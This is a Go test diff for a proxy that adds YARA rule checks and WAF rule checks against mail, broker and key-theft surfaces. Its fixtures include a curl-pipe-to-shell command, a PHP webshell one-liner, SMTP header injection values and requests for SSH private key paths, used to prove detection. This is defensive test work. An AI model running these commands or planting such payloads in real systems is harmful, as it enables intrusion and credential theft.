@@ -32,6 +32,7 @@ import (
 	"github.com/rom/xproxy/internal/mfa"
 	"github.com/rom/xproxy/internal/passwd"
 	"github.com/rom/xproxy/internal/waf"
+	"github.com/rom/xproxy/internal/yara"
 )
 
 var nolog = slog.New(slog.NewTextHandler(io.Discard, nil))
@@ -79,6 +80,7 @@ func TestYAMLDocuments(t *testing.T) {
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/openapi/orders.yaml", filepath.Join(dir, "filters", "orders-openapi.yaml")))
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/staff.htpasswd", usersFile(t)))
 			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/mfa", mfaFile(t)))
+			data = []byte(strings.ReplaceAll(string(data), "/etc/xproxy/rules/stream.yar", filepath.Join(dir, "yara", "rules.yar")))
 			if strings.Contains(string(data), "\nversion: 1\n") || strings.HasPrefix(string(data), "version: 1\n") {
 				if _, err := config.ParseWith(data, false); err != nil {
 					t.Fatalf("complete document: %v", err)
@@ -101,6 +103,52 @@ routes:
 				t.Fatalf("fragment: %v", err)
 			}
 		})
+	}
+}
+
+// TestYARARules compiles the example rule set and checks that each
+// rule matches something it claims to and nothing it does not. A rule
+// file that compiles but matches nothing is the failure mode worth
+// catching.
+func TestYARARules(t *testing.T) {
+	rs, err := yara.LoadFile(filepath.Join(root(t), "yara", "rules.yar"))
+	if err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	cases := []struct {
+		rule  string
+		input string
+	}{
+		{"executable_header", "MZ\x90\x00\x03 padding PE\x00\x00 rest"},
+		{"executable_header", "\x7fELF\x02\x01\x01"},
+		{"archive_of_executables", "PK\x03\x04 invoice.EXE"},
+		{"shell_payload", "curl -s http://x | sh ; chmod +x /tmp/a"},
+		{"credential_exfiltration", "key=AKIAIOSFODNN7EXAMPLE"},
+		{"credential_exfiltration", "-----BEGIN OPENSSH PRIVATE KEY-----"},
+		{"internal_marker", "this file is XPROXY-INTERNAL-ONLY"},
+		{"webshell_upload", "<?php eval(base64_decode($_POST[0])); ?>"},
+		{"sqlite_database", "SQLite format 3\x00 rest of the header"},
+	}
+	for _, c := range cases {
+		found := false
+		for _, m := range rs.Scan([]byte(c.input)) {
+			if m.Rule == c.rule {
+				found = true
+			}
+		}
+		if !found {
+			t.Errorf("%s did not match %q", c.rule, c.input)
+		}
+	}
+	// Ordinary traffic must not trip any of them.
+	for _, clean := range []string{
+		"GET /index.html HTTP/1.1\r\nHost: example.com\r\n\r\n",
+		"{\"order\": 42, \"customer\": \"acme\"}",
+		"a plain text document about curl and shells",
+	} {
+		if ms := rs.Scan([]byte(clean)); len(ms) != 0 {
+			t.Errorf("%q matched %v", clean, ms)
+		}
 	}
 }
 
@@ -964,4 +1012,106 @@ func attr(v filter.Verdict, name string) any {
 // the rules that matched.
 func matchedRule(v filter.Verdict, id string) bool {
 	return strings.Contains(fmt.Sprint(attr(v, "waf_matched")), id)
+}
+
+// TestWAFProtocolSurfaceRules compiles the fourth custom rule file and
+// puts one request through every rule in it, then the traffic that must
+// still pass. These name the web surfaces that sit beside the non-HTTP
+// protocols the proxy speaks, so the false-positive cases are where an
+// ordinary application looks like a mail server or a broker.
+func TestWAFProtocolSurfaceRules(t *testing.T) {
+	e := wafEngine(t, "protocol-surface-rules.conf")
+	bare := wafEngineBare(t, "protocol-surface-rules.conf")
+	get := func(path string, hdr ...string) *http.Request {
+		r := httptest.NewRequest("GET", "http://www.example.com"+path, nil)
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		for i := 0; i+1 < len(hdr); i += 2 {
+			r.Header.Set(hdr[i], hdr[i+1])
+		}
+		return r
+	}
+	post := func(path, ctype, body string, hdr ...string) *http.Request {
+		r := httptest.NewRequest("POST", "http://www.example.com"+path, strings.NewReader(body))
+		r.Header.Set("Content-Type", ctype)
+		r.Header.Set("Content-Length", fmt.Sprint(len(body)))
+		r.Header.Set("User-Agent", "Mozilla/5.0")
+		for i := 0; i+1 < len(hdr); i += 2 {
+			r.Header.Set(hdr[i], hdr[i+1])
+		}
+		return r
+	}
+	form := func(values url.Values, hdr ...string) *http.Request {
+		return post("/submit", "application/x-www-form-urlencoded", values.Encode(), hdr...)
+	}
+	for _, c := range []struct {
+		id   string
+		name string
+		mk   func() *http.Request
+	}{
+		{"23001", "webmail path", func() *http.Request { return get("/roundcube/") }},
+		{"23001", "mail administration path", func() *http.Request { return get("/postfixadmin/login.php") }},
+		{"23002", "exchange autodiscover", func() *http.Request { return get("/autodiscover/autodiscover.xml") }},
+		{"23002", "zimbra soap", func() *http.Request { return get("/service/soap/AuthRequest") }},
+		{"23003", "postfix main.cf", func() *http.Request { return get("/etc/postfix/main.cf") }},
+		{"23004", "line break in a mail header field", func() *http.Request {
+			return form(url.Values{"subject": {"hello\r\nBcc: victim@example.com"}})
+		}},
+		{"23005", "smtp command in a parameter", func() *http.Request {
+			return form(url.Values{"note": {"x%0d%0aRCPT TO: <victim@example.com>"}})
+		}},
+		{"23011", "broker client listing", func() *http.Request { return get("/api/v5/clients?page=1") }},
+		{"23012", "broker system tree", func() *http.Request { return get("/bridge?topic=%24SYS/broker/clients") }},
+		{"23013", "wildcard subscription", func() *http.Request { return get("/bridge?topic=%23") }},
+		{"23014", "broker configuration file", func() *http.Request { return get("/config/mosquitto.conf") }},
+		{"23021", "private key path", func() *http.Request { return get("/backup/.ssh/id_ed25519") }},
+		{"23021", "known hosts", func() *http.Request { return get("/home/deploy/.ssh/known_hosts") }},
+		{"23022", "filezilla session file", func() *http.Request { return get("/backup/sitemanager.xml") }},
+		{"23023", "remote access console", func() *http.Request { return get("/guacamole/") }},
+		{"23024", "private key in a form field", func() *http.Request {
+			return form(url.Values{"key": {"-----BEGIN OPENSSH PRIVATE KEY-----\nZGVjb3k=\n-----END OPENSSH PRIVATE KEY-----\n"}})
+		}},
+		{"23024", "private key in a json body", func() *http.Request {
+			return post("/api/keys", "application/json",
+				`{"key":"-----BEGIN RSA PRIVATE KEY-----\nZGVjb3k=\n-----END RSA PRIVATE KEY-----"}`)
+		}},
+		{"23033", "masque target path", func() *http.Request { return get("/.well-known/masque/udp/10.0.0.1/53/") }},
+		{"23041", "protocol scanner", func() *http.Request {
+			return get("/", "User-Agent", "Mozilla/5.0 zgrab/0.x")
+		}},
+		{"23042", "host and port in a form", func() *http.Request {
+			return form(url.Values{"host": {"10.0.0.5"}, "port": {"1883"}})
+		}},
+	} {
+		v := wafRequest(t, bare, c.mk())
+		if !v.Deny {
+			t.Errorf("%s (%s): %+v, want a deny", c.name, c.id, v)
+			continue
+		}
+		if !matchedRule(v, c.id) {
+			t.Errorf("%s: denied by %v, want rule %s among them", c.name, attr(v, "waf_matched"), c.id)
+		}
+		if v := wafRequest(t, e, c.mk()); !v.Deny {
+			t.Errorf("%s: passed with the CRS loaded: %+v", c.name, v)
+		}
+	}
+	// What an ordinary application sends that is close enough to one of
+	// these rules to be worth proving. A blog about mail servers, a
+	// form with a subject line, a topic parameter that names one topic.
+	for _, c := range []struct {
+		name string
+		r    *http.Request
+	}{
+		{"an article about mail", get("/blog/how-we-run-postfix")},
+		{"a subject line with no line break", form(url.Values{"subject": {"Order 4821 confirmed"}})},
+		{"a named topic", get("/bridge?topic=sensors/17/telemetry")},
+		{"a host with no port", form(url.Values{"host": {"cdn.example.com"}})},
+		{"a port that is not a service port", form(url.Values{"host": {"10.0.0.5"}, "port": {"8080"}})},
+		{"a public key upload", form(url.Values{"key": {"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5 deploy@example.com"}})},
+		{"a well-known path that is not masque", get("/.well-known/security.txt")},
+		{"an ordinary browser", get("/products?page=2")},
+	} {
+		if v := wafRequest(t, e, c.r); v.Deny {
+			t.Errorf("%s was denied: %+v", c.name, v)
+		}
+	}
 }
